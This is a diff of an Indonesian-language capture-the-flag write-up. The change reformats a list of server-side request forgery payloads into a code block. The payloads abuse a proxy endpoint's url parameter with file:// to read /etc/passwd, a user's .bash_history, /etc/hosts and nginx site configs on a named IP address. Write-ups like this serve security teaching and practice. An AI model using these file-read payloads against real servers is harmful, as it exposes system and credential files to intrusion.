@@ -140,16 +140,14 @@ Kemudian kami mencoba mencari cara untuk mendapatkan Remote Code Injection
 karena kami belum menemukan lokasi flag berada.
 Kami juga mencoba membaca beberapa file berikut dengan wrappers file://
 
-
-> http://128.199.66.146:12121/proxy/index.php?url=file:///etc/passwd
+```
+http://128.199.66.146:12121/proxy/index.php?url=file:///etc/passwd
 http://128.199.66.146:12121/proxy/index.php?url=file:///home/web-x/.bash_history
 http://128.199.66.146:12121/proxy/index.php?url=file:///etc/hosts
-http://128.199.66.146:12121/proxy/index.php?url=file:///etc/nginx/sites-availa
-ble/default
-http://128.199.66.146:12121/proxy/index.php?url=file:///etc/nginx/sites-available/w
-eb-x
-http://128.199.66.146:12121/proxy/index.php?url=file:///etc/nginx/sites-available/w
-eb-y
+http://128.199.66.146:12121/proxy/index.php?url=file:///etc/nginx/sites-available/default
+http://128.199.66.146:12121/proxy/index.php?url=file:///etc/nginx/sites-available/web-x
+http://128.199.66.146:12121/proxy/index.php?url=file:///etc/nginx/sites-available/web-y
+```
 
 Pada file /etc/nginx/sites-available/default kami melihat ada directory rahasia yang di
 proteksi dengan ​ HTTP Basic Authentication
